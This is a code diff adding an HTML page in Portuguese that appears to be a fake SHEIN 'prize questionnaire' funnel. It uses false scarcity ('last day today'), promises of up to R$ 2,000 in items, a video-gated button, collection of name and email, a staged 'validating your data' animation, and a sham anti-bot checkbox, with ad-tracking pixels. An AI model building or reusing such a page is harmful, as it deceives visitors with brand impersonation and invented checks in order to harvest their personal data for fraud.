@@ -1,0 +1,171 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<meta charset="utf-8">
+<!-- UTMify Pixel -->
+<script>
+  window.pixelId = "679fb0f4bbdfc9f47bf2c735";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+<!-- UTMify UTM -->
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>SHEIN | Questionário Premiado 17 Anos</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="css/shein.css">
+<script src="js/shared.js"></script>
+<script src="js/zfhh5mxwap.jsonp" async=""></script>
+<script src="js/E-v1.js" async=""></script>
+</head>
+<body>
+<div id="app-header"></div>
+<main id="app" style="transition:opacity .15s ease"></main>
+<div id="app-footer"></div>
+<script>
+(function(){
+  mountChrome(0);
+  var SM=StepManager('app');
+
+  /* ============ WELCOME ============ */
+  SM.add('welcome',function(){
+    return '<div class="step-enter wrap-2xl px-4 py-6">'
+      +'<div class="flex justify-center mb-5">'
+        +'<span class="pill" style="background:#fce7f3;color:#be185d">\uD83C\uDF89 COMEMORA\u00C7\u00C3O 17 ANOS</span>'
+      +'</div>'
+      +'<h1 class="text-2xl sm:text-3xl font-extrabold text-center leading-tight mb-3">Voc\u00ea foi <span style="color:#be185d">selecionada</span> para o question\u00e1rio premiado da SHEIN</h1>'
+      +'<div class="rounded-xl border border-amber-200 bg-amber-50 px-4 py-3 text-sm text-amber-800 text-center mb-5">'
+        +'<strong>Hoje, '+getTodayPT()+'</strong>, \u00e9 o \u00faltimo dia para responder o question\u00e1rio e resgatar a sua premia\u00e7\u00e3o.'
+      +'</div>'
+      +'<div class="text-center mb-2"><span class="text-xs font-bold uppercase tracking-wider text-gray-400">Mat\u00e9ria exclusiva</span></div>'
+      +'<p class="text-center text-gray-600 text-sm mb-4">Assista ao v\u00eddeo abaixo antes de come\u00e7ar:</p>'
+      +'<div class="vsl-box shadow-lg mb-1">'
+        +'<div class="wistia_embed wistia_async_zfhh5mxwap videoFoam=false" data-utmify-ignore="true" style="position:absolute;top:0;left:0;width:100%;height:100%"> </div>'
+      +'</div>'
+      +'<div class="mt-2 mb-6"><div class="h-1.5 w-full bg-gray-100 rounded-full overflow-hidden"><div id="vslbar" class="h-full rounded-full" style="width:0%;background:#be185d;transition:width 1s linear"></div></div><p class="text-[11px] text-gray-400 mt-1 text-center">O bot\u00e3o ser\u00e1 liberado em instantes...</p></div>'
+      +'<button id="welcome-cta" class="btn-primary w-full rounded-xl py-4 text-base opacity-40" disabled>Aguarde o v\u00eddeo...</button>'
+      +'<div class="flex items-center justify-center gap-4 mt-4 text-[11px] text-gray-400"><span>\uD83D\uDD12 Ambiente seguro</span><span>\u2022</span><span>\uD83C\uDDE7\uD83C\uDDF7 SHEIN Brasil</span></div>'
+    +'</div>';
+  },function(){
+    var cta=document.getElementById('welcome-cta');
+    unlockVideoBtn({barId:'vslbar',ctaId:'welcome-cta',seconds:60,label:'Come\u00e7ar agora \u2192'});
+    cta.onclick=function(){if(!cta.disabled)SM.go('name');};
+  });
+
+  /* ============ NAME ============ */
+  SM.add('name',function(){
+    setProgress(8);
+    return '<div class="step-enter wrap-md px-4 py-8">'
+      +'<span class="pill mb-4" style="background:#f3f4f6;color:#6b7280">PASSO 1 DE 4 \u00b7 IDENTIFICA\u00C7\u00C3O</span>'
+      +'<h2 class="text-2xl font-extrabold mt-3 mb-2">Qual \u00e9 o seu nome?</h2>'
+      +'<p class="text-gray-500 mb-6">Vamos personalizar a sua experi\u00eancia no question\u00e1rio.</p>'
+      +'<input id="f-name" type="text" class="input-field" placeholder="Seu nome" autocomplete="given-name">'
+      +'<input id="f-sname" type="text" class="input-field mt-3" placeholder="Seu sobrenome" autocomplete="family-name">'
+      +'<button id="name-cta" class="btn-primary w-full rounded-xl py-4 text-base mt-5 opacity-40" disabled>Continuar</button>'
+    +'</div>';
+  },function(){
+    var inp=document.getElementById('f-name'),snm=document.getElementById('f-sname'),cta=document.getElementById('name-cta');
+    var pre=LS.get('funil_nome');if(pre)inp.value=pre;
+    var pre2=LS.get('funil_sobrenome');if(pre2)snm.value=pre2;
+    function chk(){var ok=inp.value.trim().length>=2&&snm.value.trim().length>=2;cta.disabled=!ok;cta.className='btn-primary w-full rounded-xl py-4 text-base mt-5'+(ok?'':' opacity-40');}
+    inp.oninput=chk;snm.oninput=chk;chk();inp.focus();
+    cta.onclick=function(){if(cta.disabled)return;LS.set('funil_nome',inp.value.trim());LS.set('funil_sobrenome',snm.value.trim());SM.go('nameConfirm');};
+  });
+
+  /* ============ NAME CONFIRM ============ */
+  SM.add('nameConfirm',function(){
+    setProgress(10);
+    var nome=LS.get('funil_nome').split(' ')[0];
+    var completo=(LS.get('funil_nome')+' '+(LS.get('funil_sobrenome')||'')).trim();
+    return '<div class="step-enter wrap-md px-4 py-10 text-center">'
+      +'<div class="text-5xl mb-4">\uD83D\uDC4B</div>'
+      +'<h2 class="text-2xl font-extrabold mb-3">Prazer, '+escHtml(nome)+'!</h2>'
+      +'<p class="text-gray-600 mb-7">Confirme: podemos seguir com o seu nome <strong>'+escHtml(completo)+'</strong> para liberar a sua participa\u00e7\u00e3o?</p>'
+      +'<button id="nc-yes" class="btn-primary w-full rounded-xl py-4 text-base mb-3">Sim, pode continuar</button>'
+      +'<button id="nc-no" class="btn-outline w-full rounded-xl py-3 text-sm">N\u00e3o, corrigir nome</button>'
+    +'</div>';
+  },function(){
+    document.getElementById('nc-yes').onclick=function(){SM.go('email');};
+    document.getElementById('nc-no').onclick=function(){SM.go('name');};
+  });
+
+  /* ============ EMAIL ============ */
+  SM.add('email',function(){
+    setProgress(14);
+    var nome=LS.get('funil_nome').split(' ')[0];
+    return '<div class="step-enter wrap-md px-4 py-8">'
+      +'<span class="pill mb-4" style="background:#f3f4f6;color:#6b7280">PASSO 2 DE 4 \u00b7 CONTATO</span>'
+      +'<h2 class="text-2xl font-extrabold mt-3 mb-2">'+escHtml(nome)+', qual \u00e9 o seu melhor e-mail?</h2>'
+      +'<p class="text-gray-500 mb-2">Em poucos minutos voc\u00ea pode receber at\u00e9 <strong>R$ 2.000</strong> em itens!</p>'
+      +'<p class="text-xs text-gray-400 mb-6">Usaremos para enviar o comprovante da sua premia\u00e7\u00e3o.</p>'
+      +'<input id="f-email" type="email" class="input-field" placeholder="seu@email.com" autocomplete="email">'
+      +'<button id="email-cta" class="btn-primary w-full rounded-xl py-4 text-base mt-5 opacity-40" disabled>Continuar</button>'
+    +'</div>';
+  },function(){
+    var inp=document.getElementById('f-email'),cta=document.getElementById('email-cta');
+    var pre=LS.get('funil_email');if(pre)inp.value=pre;
+    function valid(v){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);}
+    function chk(){var ok=valid(inp.value.trim());cta.disabled=!ok;cta.className='btn-primary w-full rounded-xl py-4 text-base mt-5'+(ok?'':' opacity-40');}
+    inp.oninput=chk;chk();inp.focus();
+    cta.onclick=function(){if(cta.disabled)return;LS.set('funil_email',inp.value.trim());SM.go('validating');};
+  });
+
+  /* ============ VALIDATING ============ */
+  SM.add('validating',function(){
+    setProgress(16);
+    return '<div class="step-enter wrap-md px-4 py-16 text-center">'
+      +'<div class="flex justify-center mb-6"><div class="spinner"></div></div>'
+      +'<h2 class="text-xl font-extrabold mb-2">Validando seus dados...</h2>'
+      +'<p class="text-gray-500 mb-6">Aguarde enquanto confirmamos a sua participa\u00e7\u00e3o.</p>'
+      +'<div id="valist" class="text-left max-w-xs mx-auto space-y-3"></div>'
+    +'</div>';
+  },function(){
+    var items=['Verificando elegibilidade','Confirmando dados de contato','Reservando sua vaga no question\u00e1rio'];
+    var box=document.getElementById('valist');
+    box.innerHTML=items.map(function(it,i){return '<div id="va'+i+'" class="flex items-center gap-3 text-sm text-gray-400"><span class="w-5 h-5 rounded-full border-2 border-gray-200 flex items-center justify-center text-[10px]">'+(i+1)+'</span><span>'+it+'</span></div>';}).join('');
+    var d=0;var iv=setInterval(function(){var el=document.getElementById('va'+d);if(el){el.className='flex items-center gap-3 text-sm text-gray-800 font-medium';el.querySelector('span').outerHTML='<span class="w-5 h-5 rounded-full bg-green-500 text-white flex items-center justify-center text-[10px]">\u2713</span>';}d++;if(d>=items.length){clearInterval(iv);setTimeout(function(){SM.go('verified');},900);}},1300);
+  });
+
+  /* ============ VERIFIED ============ */
+  SM.add('verified',function(){
+    setProgress(18);
+    var nome=LS.get('funil_nome').split(' ')[0];
+    return '<div class="step-enter wrap-md px-4 py-14 text-center">'
+      +'<div class="flex justify-center mb-5"><div class="w-20 h-20 rounded-full bg-green-500 flex items-center justify-center text-white text-4xl heartbeat">\u2713</div></div>'
+      +'<h2 class="text-2xl font-extrabold mb-3">Parab\u00e9ns, '+escHtml(nome)+'!</h2>'
+      +'<p class="text-gray-600 mb-2">Sua participa\u00e7\u00e3o foi <strong>confirmada</strong> com sucesso.</p>'
+      +'<p class="text-gray-500 text-sm mb-7">Agora vamos \u00e0s perguntas do question\u00e1rio premiado.</p>'
+      +'<button id="v-cta" class="btn-primary w-full rounded-xl py-4 text-base">Continuar \u2192</button>'
+    +'</div>';
+  },function(){
+    fireConfetti(50);
+    document.getElementById('v-cta').onclick=function(){SM.go('antibot');};
+  });
+
+  /* ============ ANTI-BOT ============ */
+  SM.add('antibot',function(){
+    setProgress(22);
+    return '<div class="step-enter wrap-md px-4 py-10 text-center">'
+      +'<div class="text-4xl mb-4">\uD83E\uDD16</div>'
+      +'<h2 class="text-xl font-extrabold mb-2">Confirma\u00e7\u00e3o de seguran\u00e7a</h2>'
+      +'<p class="text-gray-500 mb-6">Para garantir que voc\u00ea n\u00e3o \u00e9 um rob\u00f4, selecione a op\u00e7\u00e3o abaixo:</p>'
+      +'<label class="flex items-center gap-3 border-2 border-gray-200 rounded-xl px-4 py-4 cursor-pointer option-card" id="ab-box">'
+        +'<input id="ab-chk" type="checkbox" class="w-6 h-6 accent-black"><span class="font-medium text-gray-800">N\u00e3o sou um rob\u00f4</span>'
+      +'</label>'
+      +'<button id="ab-cta" class="btn-primary w-full rounded-xl py-4 text-base mt-6 opacity-40" disabled>Iniciar question\u00e1rio</button>'
+    +'</div>';
+  },function(){
+    var chk=document.getElementById('ab-chk'),cta=document.getElementById('ab-cta');
+    chk.onchange=function(){cta.disabled=!chk.checked;cta.className='btn-primary w-full rounded-xl py-4 text-base mt-6'+(chk.checked?'':' opacity-40');};
+    cta.onclick=function(){if(cta.disabled)return;__funilNav('quiz/index.html');};
+  });
+
+  SM.go('welcome');
+})();
+</script>
+
+
+</body></html>
